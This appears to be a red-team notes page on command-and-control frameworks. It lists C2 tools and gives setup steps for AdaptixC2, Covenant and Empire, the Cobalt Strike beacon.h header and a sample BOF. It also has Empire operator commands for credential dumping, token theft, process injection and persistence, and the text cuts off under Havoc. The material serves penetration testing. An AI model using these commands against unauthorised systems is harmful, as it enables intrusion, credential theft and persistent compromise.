# Command and Control

- [Resources](#resources)

## Table of Contents

- [AdaptixC2](#adaptixc2)
- [Beacon Object Files (BOF)](#beacon-object-files-bof)
- [Covenant](#covenant)
- [Empire](#empire)
- [Hak5 Cloud C2](#hak5-cloud-c2)
- [Havoc](#havoc)
- [Loki](#loki)
- [Merlin](#merlin)
- [Mythic](#mythic)
- [Redirector](#redirector)
- [Sliver](#sliver)
- [Villain](#villain)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| AdaptixC2 | Adaptix is an extensible post-exploitation and adversarial emulation framework made for penetration testers. | https://github.com/Adaptix-Framework/AdaptixC2 |
| AzureC2Relay | AzureC2Relay is an Azure Function that validates and relays Cobalt Strike beacon traffic by verifying the incoming requests based on a Cobalt Strike Malleable C2 profile. | https://github.com/Flangvik/AzureC2Relay |
| Brute Ratel | A Customized Command and Control Center for Red Team and Adversary Simulation | https://bruteratel.com/ |
| Cobalt Strike | Adversary Simulation and Red Team Operations | https://www.cobaltstrike.com/ |
| Conquest | Conquest is a feature-rich and malleable command & control/post-exploitation framework developed in Nim. | https://github.com/jakobfriedl/conquest |
| convoC2 | C2 infrastructure that allows Red Teamers to execute system commands on compromised hosts through Microsoft Teams. | https://github.com/cxnturi0n/convoC2 |
| Covenant | Covenant is a .NET command and control framework that aims to highlight the attack surface of .NET, make the use of offensive .NET tradecraft easier, and serve as a collaborative command and control platform for red teamers. | https://github.com/cobbr/Covenant |
| DeathStar | DeathStar is a Python script that uses Empire's RESTful API to automate gaining Domain and/or Enterprise Admin rights in Active Directory environments using some of the most common offensive TTPs. | https://github.com/byt3bl33d3r/DeathStar |
| Empire | Empire 4 is a post-exploitation framework that includes a pure-PowerShell Windows agents, Python 3.x Linux/OS X agents, and C# agents. | https://github.com/BC-SECURITY/Empire |
| Hardhat C2 | A c# Command & Control framework | https://github.com/DragoQCC/HardHatC2 |
| Havoc | The Havoc Framework | https://github.com/HavocFramework/Havoc |
| KillDefenderBOF | Beacon Object File PoC implementation of KillDefender | https://github.com/Cerbersec/KillDefenderBOF |
| Loki | 🧙‍♂️ Node JS C2 for backdooring vulnerable Electron applications | https://github.com/boku7/Loki |
| Merlin | Merlin is a cross-platform post-exploitation HTTP/2 Command & Control server and agent written in golang. | https://github.com/Ne0nd0g/merlin |
| Merlin Agent | Post-exploitation agent for Merlin | https://github.com/Ne0nd0g/merlin-agent |
| Merlin Agent Dynamic Link Library (DLL) | This repository contains the very minimal C code file that is used to compile a Merlin agent into a DLL. | https://github.com/Ne0nd0g/merlin-agent-dll | 
| MoveKit | Cobalt Strike kit for Lateral Movement | https://github.com/0xthirteen/MoveKit |
| Mythic | A cross-platform, post-exploit, red teaming framework built with python3, docker, docker-compose, and a web browser UI. It's designed to provide a collaborative and user friendly interface for operators, managers, and reporting throughout red teaming. | https://github.com/its-a-feature/Mythic |
| Nightmangle | Nightmangle is post-exploitation Telegram Command and Control (C2/C&C) Agent, created by @1N73LL1G3NC3. | https://github.com/1N73LL1G3NC3x/Nightmangle |
| Nimhawk | A powerful, modular, lightweight and efficient command & control framework written in Nim. | https://github.com/hdbreaker/Nimhawk |
| NimPlant | A light-weight first-stage C2 implant written in Nim. | https://github.com/chvancooten/NimPlant |
| Nuages | A modular C2 framework | https://github.com/p3nt4/Nuages |
| PoshC2 | A proxy aware C2 framework used to aid red teamers with post-exploitation and lateral movement. | https://github.com/nettitude/PoshC2 |
| REC2 (Rusty External C2) | REC2 (Rusty External Command and Control) is client and server tool allowing auditor to execute command from VirusTotal and Mastodon APIs written in Rust. 🦀 | https://github.com/g0h4n/REC2 |
| RedWarden | Cobalt Strike C2 Reverse proxy that fends off Blue Teams, AVs, EDRs, scanners through packet inspection and malleable profile correlation | https://github.com/mgeeky/RedWarden |
| SharpC2 | Command and Control Framework written in C# | https://github.com/rasta-mouse/SharpC2 |
| SILENTTRINITY | An asynchronous, collaborative post-exploitation agent powered by Python and .NET's DLR | https://github.com/byt3bl33d3r/SILENTTRINITY |
| Sliver | Sliver is an open source cross-platform adversary emulation/red team framework, it can be used by organizations of all sizes to perform security testing. | https://github.com/BishopFox/sliver |
| SharpLAPS | Retrieve LAPS password from LDAP | https://github.com/swisskyrepo/SharpLAPS |
| SPAWN | Cobalt Strike BOF that spawns a sacrificial process, injects it with shellcode, and executes payload. Built to evade EDR/UserLand hooks by spawning sacrificial process with Arbitrary Code Guard (ACG), BlockDll, and PPID spoofing. | https://github.com/boku7/SPAWN |
| Tempest | A command and control framework written in rust. | https://github.com/Teach2Breach/Tempest |
| Villain | Villain is a C2 framework that can handle multiple TCP socket & HoaxShell-based reverse shells, enhance their functionality with additional features (commands, utilities etc) and share them among connected sibling servers (Villain instances running on different machines). | https://github.com/t3l3machus/Villain |

## AdaptixC2

> https://github.com/Adaptix-Framework/AdaptixC2

> https://adaptix-framework.gitbook.io/adaptix-framework

> https://github.com/Adaptix-Framework/Extension-Kit

### Prerequisites

#### Server

```console
$ sudo apt install mingw-w64 make

$ wget https://go.dev/dl/go1.24.4.linux-amd64.tar.gz -O /tmp/go1.24.4.linux-amd64.tar.gz
$ sudo rm -rf /usr/local/go /usr/local/bin/go
$ sudo tar -C /usr/local -xzf /tmp/go1.24.4.linux-amd64.tar.gz
$ sudo ln -s /usr/local/go/bin/go /usr/local/bin/go

# for windows 7 support by gopher agent
$git clone https://github.com/Adaptix-Framework/go-win7 /tmp/go-win7
$ sudo mv /tmp/go-win7 /usr/lib/
```

#### Client

```console
$ sudo apt install gcc g++ build-essential make cmake libssl-dev qt6-base-dev qt6-websockets-dev qt6-declarative-dev
```

#### Build Binaries

```console
$ make server
$ make extenders
$ make client
```

### Configuration

#### Certificate

```console
$ openssl req -x509 -nodes -newkey rsa:2048 -keyout server.rsa.key -out server.rsa.crt -days 3650
```

#### profile.json

```json
{
  "Teamserver": {
    "port": 4321,
    "endpoint": "/endpoint",
    "password": "pass",
    "cert": "server.rsa.crt",
    "key": "server.rsa.key",
    "extenders": [
      "extenders/listener_beacon_http/config.json",
      "extenders/listener_beacon_smb/config.json",
      "extenders/listener_beacon_tcp/config.json",
      "extenders/agent_beacon/config.json",
      "extenders/listener_gopher_tcp/config.json",
      "extenders/agent_gopher/config.json"
    ],
    "access_token_live_hours": 12,
    "refresh_token_live_hours": 168
  },

  "ServerResponse": {
    "status": 404,
    "headers": {
      "Content-Type": "text/html; charset=UTF-8",
      "Server": "AdaptixC2",
      "Adaptix Version": "v0.6"
    },
    "page": "404page.html"
  },
  
  "EventCallback": {
    "Telegram": {
      "token": "",
      "chats_id": []
    },
    "new_agent_message": "New agent: %type% (%id%)\n\n%user% @ %computer% (%internalip%)\nelevated: %elevated%\nfrom: %externalip%\ndomain: %domain%"
  }
}
```

#### Start Teamserver

```console
$ ./adaptixserver -profile profile.json
```

#### Start Client

```console
$ ./AdaptixClient
```

## Beacon Object Files (BOF)

> https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_how-to-develop.htm

### Introduction

- Written in C or C++
- Compiled it into Common Object File Format (COFF)
- BOF Loader is needed to read compiled BOF and execute them in memory (COFF Loader)

### Header Files

> https://hstechdocs.helpsystems.com/kbfiles/cobaltstrike/attachments/beacon.h

#### beacon.h

```c
/*
 * Beacon Object Files (BOF)
 * -------------------------
 * A Beacon Object File is a light-weight post exploitation tool that runs
 * with Beacon's inline-execute command.
 *
 * Additional BOF resources are available here:
 *   - https://github.com/Cobalt-Strike/bof_template
 *
 * Cobalt Strike 4.x
 * ChangeLog:
 *    1/25/2022: updated for 4.5
 *    7/18/2023: Added BeaconInformation API for 4.9
 *    7/31/2023: Added Key/Value store APIs for 4.9
 *                  BeaconAddValue, BeaconGetValue, and BeaconRemoveValue
 *    8/31/2023: Added Data store APIs for 4.9
 *                  BeaconDataStoreGetItem, BeaconDataStoreProtectItem,
 *                  BeaconDataStoreUnprotectItem, and BeaconDataStoreMaxEntries
 *    9/01/2023: Added BeaconGetCustomUserData API for 4.9
 *    3/21/2024: Updated BeaconInformation API for 4.10 to return a BOOL
 *               Updated the BEACON_INFO data structure to add new parameters
 *    4/19/2024: Added BeaconGetSyscallInformation API for 4.10
 *    4/25/2024: Added APIs to call Beacon's system call implementation
 *    12/18/2024: Updated BeaconGetSyscallInformation API for 4.11 (Breaking changes)
 *    2/13/2025: Updated SYSCALL_API structure with more ntAPIs
 */
#ifndef _BEACON_H_
#define _BEACON_H_
#include <windows.h>

#ifdef __cplusplus
extern "C" {
#endif // __cplusplus

/* data API */
typedef struct {
	char * original; /* the original buffer [so we can free it] */
	char * buffer;   /* current pointer into our buffer */
	int    length;   /* remaining length of data */
	int    size;     /* total size of this buffer */
} datap;

DECLSPEC_IMPORT void    BeaconDataParse(datap * parser, char * buffer, int size);
DECLSPEC_IMPORT char *  BeaconDataPtr(datap * parser, int size);
DECLSPEC_IMPORT int     BeaconDataInt(datap * parser);
DECLSPEC_IMPORT short   BeaconDataShort(datap * parser);
DECLSPEC_IMPORT int     BeaconDataLength(datap * parser);
DECLSPEC_IMPORT char *  BeaconDataExtract(datap * parser, int * size);

/* format API */
typedef struct {
	char * original; /* the original buffer [so we can free it] */
	char * buffer;   /* current pointer into our buffer */
	int    length;   /* remaining length of data */
	int    size;     /* total size of this buffer */
} formatp;

DECLSPEC_IMPORT void    BeaconFormatAlloc(formatp * format, int maxsz);
DECLSPEC_IMPORT void    BeaconFormatReset(formatp * format);
DECLSPEC_IMPORT void    BeaconFormatAppend(formatp * format, const char * text, int len);
DECLSPEC_IMPORT void    BeaconFormatPrintf(formatp * format, const char * fmt, ...);
DECLSPEC_IMPORT char *  BeaconFormatToString(formatp * format, int * size);
DECLSPEC_IMPORT void    BeaconFormatFree(formatp * format);
DECLSPEC_IMPORT void    BeaconFormatInt(formatp * format, int value);

/* Output Functions */
#define CALLBACK_OUTPUT      0x0
#define CALLBACK_OUTPUT_OEM  0x1e
#define CALLBACK_OUTPUT_UTF8 0x20
#define CALLBACK_ERROR       0x0d
#define CALLBACK_CUSTOM      0x1000
#define CALLBACK_CUSTOM_LAST 0x13ff


DECLSPEC_IMPORT void   BeaconOutput(int type, const char * data, int len);
DECLSPEC_IMPORT void   BeaconPrintf(int type, const char * fmt, ...);


/* Token Functions */
DECLSPEC_IMPORT BOOL   BeaconUseToken(HANDLE token);
DECLSPEC_IMPORT void   BeaconRevertToken();
DECLSPEC_IMPORT BOOL   BeaconIsAdmin();

/* Spawn+Inject Functions */
DECLSPEC_IMPORT void   BeaconGetSpawnTo(BOOL x86, char * buffer, int length);
DECLSPEC_IMPORT void   BeaconInjectProcess(HANDLE hProc, int pid, char * payload, int p_len, int p_offset, char * arg, int a_len);
DECLSPEC_IMPORT void   BeaconInjectTemporaryProcess(PROCESS_INFORMATION * pInfo, char * payload, int p_len, int p_offset, char * arg, int a_len);
DECLSPEC_IMPORT BOOL   BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO * si, PROCESS_INFORMATION * pInfo);
DECLSPEC_IMPORT void   BeaconCleanupProcess(PROCESS_INFORMATION * pInfo);

/* Utility Functions */
DECLSPEC_IMPORT BOOL   toWideChar(char * src, wchar_t * dst, int max);

/* Beacon Information */
/*
 *  ptr  - pointer to the base address of the allocated memory.
 *  size - the number of bytes allocated for the ptr.
 */
typedef struct {
	char * ptr;
	size_t size;
} HEAP_RECORD;
#define MASK_SIZE 13

/* Information the user can set in the USER_DATA via a UDRL */
typedef enum {
	PURPOSE_EMPTY,
	PURPOSE_GENERIC_BUFFER,
	PURPOSE_BEACON_MEMORY,
	PURPOSE_SLEEPMASK_MEMORY,
	PURPOSE_BOF_MEMORY,
	PURPOSE_USER_DEFINED_MEMORY = 1000
} ALLOCATED_MEMORY_PURPOSE;

typedef enum {
	LABEL_EMPTY,
	LABEL_BUFFER,
	LABEL_PEHEADER,
	LABEL_TEXT,
	LABEL_RDATA,
	LABEL_DATA,
	LABEL_PDATA,
	LABEL_RELOC,
	LABEL_USER_DEFINED = 1000
} ALLOCATED_MEMORY_LABEL;

typedef enum {
	METHOD_UNKNOWN,
	METHOD_VIRTUALALLOC,
	METHOD_HEAPALLOC,
	METHOD_MODULESTOMP,
	METHOD_NTMAPVIEW,
	METHOD_USER_DEFINED = 1000,
} ALLOCATED_MEMORY_ALLOCATION_METHOD;

/**
* This structure allows the user to provide additional information
* about the allocated heap for cleanup. It is mandatory to provide
* the HeapHandle but the DestroyHeap Boolean can be used to indicate
* whether the clean up code should destroy the heap or simply free the pages.
* This is useful in situations where a loader allocates memory in the
* processes current heap.
*/
typedef struct _HEAPALLOC_INFO {
	PVOID HeapHandle;
	BOOL  DestroyHeap;
} HEAPALLOC_INFO, *PHEAPALLOC_INFO;

typedef struct _MODULESTOMP_INFO {
	HMODULE ModuleHandle;
} MODULESTOMP_INFO, *PMODULESTOMP_INFO;

typedef union _ALLOCATED_MEMORY_ADDITIONAL_CLEANUP_INFORMATION {
	HEAPALLOC_INFO HeapAllocInfo;
	MODULESTOMP_INFO ModuleStompInfo;
	PVOID Custom;
} ALLOCATED_MEMORY_ADDITIONAL_CLEANUP_INFORMATION, *PALLOCATED_MEMORY_ADDITIONAL_CLEANUP_INFORMATION;

typedef struct _ALLOCATED_MEMORY_CLEANUP_INFORMATION {
	BOOL Cleanup;
	ALLOCATED_MEMORY_ALLOCATION_METHOD AllocationMethod;
	ALLOCATED_MEMORY_ADDITIONAL_CLEANUP_INFORMATION AdditionalCleanupInformation;
} ALLOCATED_MEMORY_CLEANUP_INFORMATION, *PALLOCATED_MEMORY_CLEANUP_INFORMATION;

typedef struct _ALLOCATED_MEMORY_SECTION {
	ALLOCATED_MEMORY_LABEL Label; // A label to simplify Sleepmask development
	PVOID  BaseAddress;           // Pointer to virtual address of section
	SIZE_T VirtualSize;           // Virtual size of the section
	DWORD  CurrentProtect;        // Current memory protection of the section
	DWORD  PreviousProtect;       // The previous memory protection of the section (prior to masking/unmasking)
	BOOL   MaskSection;           // A boolean to indicate whether the section should be masked
} ALLOCATED_MEMORY_SECTION, *PALLOCATED_MEMORY_SECTION;

typedef struct _ALLOCATED_MEMORY_REGION {
	ALLOCATED_MEMORY_PURPOSE Purpose;      // A label to indicate the purpose of the allocated memory
	PVOID  AllocationBase;                 // The base address of the allocated memory block
	SIZE_T RegionSize;                     // The size of the allocated memory block
	DWORD Type;                            // The type of memory allocated
	ALLOCATED_MEMORY_SECTION Sections[8];  // An array of section information structures
	ALLOCATED_MEMORY_CLEANUP_INFORMATION CleanupInformation; // Information required to cleanup the allocation
} ALLOCATED_MEMORY_REGION, *PALLOCATED_MEMORY_REGION;

typedef struct {
	ALLOCATED_MEMORY_REGION AllocatedMemoryRegions[6];
} ALLOCATED_MEMORY, *PALLOCATED_MEMORY;

/*
 *  version               - The version of the beacon dll was added for release 4.10
 *                          version format: 0xMMmmPP, where MM = Major, mm = Minor, and PP = Patch
 *                          e.g. 0x040900 -> CS 4.9
 *                               0x041000 -> CS 4.10
 *
 *  sleep_mask_ptr        - pointer to the sleep mask base address
 *  sleep_mask_text_size  - the sleep mask text section size
 *  sleep_mask_total_size - the sleep mask total memory size
 *
 *  beacon_ptr   - pointer to beacon's base address
 *                 The stage.obfuscate flag affects this value when using CS default loader.
 *                    true:  beacon_ptr = allocated_buffer - 0x1000 (Not a valid address)
 *                    false: beacon_ptr = allocated_buffer (A valid address)
 *                 For a UDRL the beacon_ptr will be set to the 1st argument to DllMain
 *                 when the 2nd argument is set to DLL_PROCESS_ATTACH.
 *  heap_records - list of memory addresses on the heap beacon wants to mask.
 *                 The list is terminated by the HEAP_RECORD.ptr set to NULL.
 *  mask         - the mask that beacon randomly generated to apply
 *
 *  Added in version 4.10
 *  allocatedMemory - An ALLOCATED_MEMORY structure that can be set in the USER_DATA
 *                     via a UDRL.
 */
typedef struct {
	unsigned int version;
	char  * sleep_mask_ptr;
	DWORD   sleep_mask_text_size;
	DWORD   sleep_mask_total_size;

	char  * beacon_ptr;
	HEAP_RECORD * heap_records;
	char    mask[MASK_SIZE];

	ALLOCATED_MEMORY allocatedMemory;
} BEACON_INFO, *PBEACON_INFO;

DECLSPEC_IMPORT BOOL   BeaconInformation(PBEACON_INFO info);

/* Key/Value store functions
 *    These functions are used to associate a key to a memory address and save
 *    that information into beacon.  These memory addresses can then be
 *    retrieved in a subsequent execution of a BOF.
 *
 *    key - the key will be converted to a hash which is used to locate the
 *          memory address.
 *
 *    ptr - a memory address to save.
 *
 * Considerations:
 *    - The contents at the memory address is not masked by beacon.
 *    - The contents at the memory address is not released by beacon.
 *
 */
DECLSPEC_IMPORT BOOL BeaconAddValue(const char * key, void * ptr);
DECLSPEC_IMPORT void * BeaconGetValue(const char * key);
DECLSPEC_IMPORT BOOL BeaconRemoveValue(const char * key);

/* Beacon Data Store functions
 *    These functions are used to access items in Beacon's Data Store.
 *    BeaconDataStoreGetItem returns NULL if the index does not exist.
 *
 *    The contents are masked by default, and BOFs must unprotect the entry
 *    before accessing the data buffer. BOFs must also protect the entry
 *    after the data is not used anymore.
 *
 */

#define DATA_STORE_TYPE_EMPTY 0
#define DATA_STORE_TYPE_GENERAL_FILE 1

typedef struct {
	int type;
	DWORD64 hash;
	BOOL masked;
	char* buffer;
	size_t length;
} DATA_STORE_OBJECT, *PDATA_STORE_OBJECT;

DECLSPEC_IMPORT PDATA_STORE_OBJECT BeaconDataStoreGetItem(size_t index);
DECLSPEC_IMPORT void BeaconDataStoreProtectItem(size_t index);
DECLSPEC_IMPORT void BeaconDataStoreUnprotectItem(size_t index);
DECLSPEC_IMPORT size_t BeaconDataStoreMaxEntries();

/* Beacon User Data functions */
DECLSPEC_IMPORT char * BeaconGetCustomUserData();

/* Beacon System call */
/* Syscalls API */
typedef struct
{
	PVOID fnAddr;
	PVOID jmpAddr;
	DWORD sysnum;
} SYSCALL_API_ENTRY, *PSYSCALL_API_ENTRY;

typedef struct
{
	SYSCALL_API_ENTRY ntAllocateVirtualMemory;
	SYSCALL_API_ENTRY ntProtectVirtualMemory;
	SYSCALL_API_ENTRY ntFreeVirtualMemory;
	SYSCALL_API_ENTRY ntGetContextThread;
	SYSCALL_API_ENTRY ntSetContextThread;
	SYSCALL_API_ENTRY ntResumeThread;
	SYSCALL_API_ENTRY ntCreateThreadEx;
	SYSCALL_API_ENTRY ntOpenProcess;
	SYSCALL_API_ENTRY ntOpenThread;
	SYSCALL_API_ENTRY ntClose;
	SYSCALL_API_ENTRY ntCreateSection;
	SYSCALL_API_ENTRY ntMapViewOfSection;
	SYSCALL_API_ENTRY ntUnmapViewOfSection;
	SYSCALL_API_ENTRY ntQueryVirtualMemory;
	SYSCALL_API_ENTRY ntDuplicateObject;
	SYSCALL_API_ENTRY ntReadVirtualMemory;
	SYSCALL_API_ENTRY ntWriteVirtualMemory;
	SYSCALL_API_ENTRY ntReadFile;
	SYSCALL_API_ENTRY ntWriteFile;
	SYSCALL_API_ENTRY ntCreateFile;
	SYSCALL_API_ENTRY ntQueueApcThread;
	SYSCALL_API_ENTRY ntCreateProcess;
	SYSCALL_API_ENTRY ntOpenProcessToken;
	SYSCALL_API_ENTRY ntTestAlert;
	SYSCALL_API_ENTRY ntSuspendProcess;
	SYSCALL_API_ENTRY ntResumeProcess;
	SYSCALL_API_ENTRY ntQuerySystemInformation;
	SYSCALL_API_ENTRY ntQueryDirectoryFile;
	SYSCALL_API_ENTRY ntSetInformationProcess;
	SYSCALL_API_ENTRY ntSetInformationThread;
	SYSCALL_API_ENTRY ntQueryInformationProcess;
	SYSCALL_API_ENTRY ntQueryInformationThread;
	SYSCALL_API_ENTRY ntOpenSection;
	SYSCALL_API_ENTRY ntAdjustPrivilegesToken;
	SYSCALL_API_ENTRY ntDeviceIoControlFile;
	SYSCALL_API_ENTRY ntWaitForMultipleObjects;
} SYSCALL_API, *PSYSCALL_API;

/* Additional Run Time Library (RTL) addresses used to support system calls.
 * If they are not set then system calls that require them will fall back
 * to the Standard Windows API.
 *
 * Required to support the following system calls:
 *    ntCreateFile
 */
typedef struct
{
	PVOID rtlDosPathNameToNtPathNameUWithStatusAddr;
	PVOID rtlFreeHeapAddr;
	PVOID rtlGetProcessHeapAddr;
} RTL_API, *PRTL_API;

/* Updated in version 4.11 to use the entire structure instead of pointers to the structure.
 * This allows for retrieving a copy of the information which would be under the BOF's
 * control instead of a reference pointer which may be obfuscated when beacon is sleeping.
 */
typedef struct
{
	SYSCALL_API syscalls;
	RTL_API     rtls;
} BEACON_SYSCALLS, *PBEACON_SYSCALLS;

/* Updated in version 4.11 to include the size of the info pointer, which equals sizeof(BEACON_SYSCALLS) */
DECLSPEC_IMPORT BOOL BeaconGetSyscallInformation(PBEACON_SYSCALLS info, SIZE_T infoSize, BOOL resolveIfNotInitialized);

/* Beacon System call functions which will use the current system call method */
DECLSPEC_IMPORT LPVOID BeaconVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
DECLSPEC_IMPORT LPVOID BeaconVirtualAllocEx(HANDLE processHandle, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
DECLSPEC_IMPORT BOOL BeaconVirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
DECLSPEC_IMPORT BOOL BeaconVirtualProtectEx(HANDLE processHandle, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
DECLSPEC_IMPORT BOOL BeaconVirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
DECLSPEC_IMPORT BOOL BeaconGetThreadContext(HANDLE threadHandle, PCONTEXT threadContext);
DECLSPEC_IMPORT BOOL BeaconSetThreadContext(HANDLE threadHandle, PCONTEXT threadContext);
DECLSPEC_IMPORT DWORD BeaconResumeThread(HANDLE threadHandle);
DECLSPEC_IMPORT HANDLE BeaconOpenProcess(DWORD desiredAccess, BOOL inheritHandle, DWORD processId);
DECLSPEC_IMPORT HANDLE BeaconOpenThread(DWORD desiredAccess, BOOL inheritHandle, DWORD threadId);
DECLSPEC_IMPORT BOOL BeaconCloseHandle(HANDLE object);
DECLSPEC_IMPORT BOOL BeaconUnmapViewOfFile(LPCVOID baseAddress);
DECLSPEC_IMPORT SIZE_T BeaconVirtualQuery(LPCVOID address, PMEMORY_BASIC_INFORMATION buffer, SIZE_T length);
DECLSPEC_IMPORT BOOL BeaconDuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions);
DECLSPEC_IMPORT BOOL BeaconReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
DECLSPEC_IMPORT BOOL BeaconWriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);

/* Beacon Gate APIs */
DECLSPEC_IMPORT VOID BeaconDisableBeaconGate();
DECLSPEC_IMPORT VOID BeaconEnableBeaconGate();

DECLSPEC_IMPORT VOID BeaconDisableBeaconGateMasking();
DECLSPEC_IMPORT VOID BeaconEnableBeaconGateMasking();

/* Beacon User Data
 *
 * version format: 0xMMmmPP, where MM = Major, mm = Minor, and PP = Patch
 * e.g. 0x040900 -> CS 4.9
 *      0x041000 -> CS 4.10
*/

#define DLL_BEACON_USER_DATA 0x0d
#define BEACON_USER_DATA_CUSTOM_SIZE 32
typedef struct
{
	unsigned int version;
	PSYSCALL_API syscalls;
	char         custom[BEACON_USER_DATA_CUSTOM_SIZE];
	PRTL_API     rtls;
	PALLOCATED_MEMORY allocatedMemory;
} USER_DATA, * PUSER_DATA;

#ifdef __cplusplus
}
#endif // __cplusplus
#endif // _BEACON_H_
```

### COFF Loader

#### TrustedSec COFFLoader

> https://github.com/trustedsec/COFFLoader

```console
$ git clone https://github.com/trustedsec/COFFLoader.git
```

```console
$ make
```

```cmd
PS C:\> COFFLoader64.exe go example.o
```

### example.c

```c
#include "beacon.h"

DECLSPEC_IMPORT DWORD KERNEL32$GetCurrentProcessId();

void go() {
	DWORD pid = KERNEL32$GetCurrentProcessId();
	BeaconPrintf(CALLBACK_OUTPUT,
				   "Current process ID: %lu",
				   pid);
}
```

### Compile

#### Linux

```console
$ x86_64-w64-mingw42-gcc -c -o example.o example.c
```

#### Windows

```cmd
PS C:\> cl /c /GS- /Foexample.obj example.c
```

## Covenant

> https://github.com/cobbr/Covenant

> https://github.com/cobbr/Covenant/wiki/Installation-And-Startup

### Prerequisites

```console
$ sudo apt-get install docker docker-compose
```

### Installation

```console
$ git clone --recurse-submodules https://github.com/cobbr/Covenant
$ cd Covenant/Covenant
$ docker build -t covenant .
```

```console
$ docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v /PATH/TO/Covenant/Covenant/Data:/app/Data covenant
```

or

```console
$ docker run -d -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v /PATH/TO/Covenant/Covenant/Data:/app/Data covenant
```

> https://127.0.0.1:7443/covenantuser/login

### Stop Covenant

```console
$ docker stop covenant
```

### Restart Covenant

```console
$ docker start covenant -ai
```

### Remove and Restart Covenant

```console
$ ~/Covenant/Covenant > docker rm covenant
$ ~/Covenant/Covenant > docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v /PATH/TO/Covenant/Covenant/Data:/app/Data covenant --username AdminUser --computername 0.0.0.0
```

## Empire

> https://github.com/BC-SECURITY/Empire

### Installation

```console
$ git clone --recursive https://github.com/BC-SECURITY/Empire.git
$ cd Empire
$ ./setup/checkout-latest-tag.sh
$ ./setup/install.sh
```

```console
$ ./ps-empire server
```

```console
$ ./ps-empire client
```

### Starkiller

> http://127.0.0.1:1337/index.html

### Common Commands

```console
(Empire) > listeners                      // list current running listeners
(Empire) > uselistener                    // configure listener
(Empire) > agents                         // list available agents
(Empire) > kill <NAME>                    // kill a specific agent
(Empire: listeners/http) > info           // provide information about used listener or module
(Empire: listeners/http) > back           // get back from current menu
(Empire: listeners) > usestager           // creating payloads
(Empire: agents) > rename <NAME> <NAME>   // renaming specific agent
(Empire: agents) > interact <NAME>        // interacting with specific agent
(Empire: agents) > searchmodule <NAME>    // search for a specific module
(Empire: <NAME>) > usemodule <NAME>       // use a specific module
(Empire: <NAME>) > sysinfo                // show system information
(Empire: <NAME>) > creds                  // show credentials
(Empire: <NAME>) > download               // download files
(Empire: <NAME>) > upload                 // upload files
(Empire: <NAME>) > sleep <60>             // set agent communication to sleep for 60 seconds
(Empire: <NAME>) > steal_token            // impersonate access token
(Empire: <NAME>) > shell [cmd]            // open a shell with cmd.exe
(Empire: <NAME>) > ps                     // show running processes
(Empire: <NAME>) > psinject               // inject agent to another process
(Empire: <NAME>) > scriptimport           // load powershell script
(Empire: <NAME>) > mimikatz               // executes sekurlsa::logonpasswords
(Empire: <NAME>) > usemodule privesc/getsystem            // try privilege escalation
(Empire: <NAME>) > usemodule privesc/sherlock             // run sherlock
(Empire: <NAME>) > usemodule privesc/powerup/allchecks    // perform privilege escalation checks
(Empire: <NAME>) > usemodule situational_awareness/host/antivirusproduct    // provides information about antivirus products
(Empire: <NAME>) > usemodule situational_awareness/host/applockerstatus     // provides information about applocker status
(Empire: <NAME>) > usemodule situational_awareness/host/computerdetails     // provides information about event ids 4648 (RDP) and 4624 (successful logon)
(Empire: <NAME>) > situational_awareness/network/get_spn                       // provides information about spns
(Empire: <NAME>) > situational_awareness/network/powerview/get_domain_trust    // show information about domain trusts
(Empire: <NAME>) > situational_awareness/network/powerview/map_domain_trust    // map information about domain trust
(Empire: <NAME>) > situational_awareness/network/bloodhound3                   // load bloodhound module
(Empire: <NAME>/situational_awareness/network/bloodhound3) > set CollectionMethodAll    // configure bloodhound module
(Empire: <NAME>/situational_awareness/network/bloodhound3) > run                        // run the module
(Empire: <NAME>) > download *bloodhound*                                                // download the module
(Empire: <NAME>) > usemodule powershell/persistence/elevated/registry    // registry persistence
(Empire: <NAME>) > usemodule persistence/misc/add_sid_history            // sid history persistence
(Empire: <NAME>) > usemodule persistence/misc/memssp                     // ssp persistence
(Empire: <NAME>) > usemodule persistence/misc/skeleton_key               // skeleton key persistence
(Empire: <NAME>) > usemodule persistence/elevated/wmi                    // wmi persistence
```

### Setup HTTP Listener

```console
(Empire) > listeners http
(Empire: listeners/http) > info
(Empire: listeners/http) > set Name <NAME>
(Empire: listeners/http) > set Host <LHOST>
(Empire: listeners/http) > set Port <PORT>
(Empire: listeners/http) > exeute
```

### Setup Stager

```console
(Empire: listeners) > usestager multi/bash
(Empire: listeners/multi/bash) > set Listener <NAME>
(Empire: listeners/multi/bash) > set OutFile /PATH/TO/FILE/<FILE>.sh
(Empire: listeners/multi/bash) > execute
```

### Setup Persistence Measures

```console
(Empire: <NAME>) > usemodule powershell/persistence/elevated/registry
(Empire: <NAME>/powershell/persistence/elevated/registry) > set Listener <NAME>
(Empire: <NAME>/powershell/persistence/elevated/registry) > run
```

## Hak5 Cloud C2

```console
$ ./c2-3.3.0_amd64_linux -hostname 127.0.0.1 -listenip 127.0.0.1
```

> http://127.0.0.1:8080

## Havoc

> https://github.com/HavocFramework/Havoc

### Python Environment

```console
$ sudo apt-get install build-essential
$ sudo add-apt-repository ppa:deadsnakes/ppa
$ sudo apt-get update
$ sudo apt-get install python3.10 python3.10-dev
```

### Prerequisites

```console
